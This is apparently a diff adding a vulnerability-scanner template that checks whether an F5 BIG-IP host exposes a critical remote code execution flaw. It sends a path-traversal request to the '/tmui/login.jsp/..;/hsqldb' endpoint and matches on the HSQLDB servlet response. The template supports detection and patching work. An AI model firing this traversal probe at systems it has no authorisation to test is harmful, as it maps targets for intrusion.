@@ -1,0 +1,19 @@
+id: f5-big-ip-rce
+info:
+  name: F5 BIG-IP Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tmui/login.jsp/..;/hsqldb"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "HSQL Database Engine Servlet"
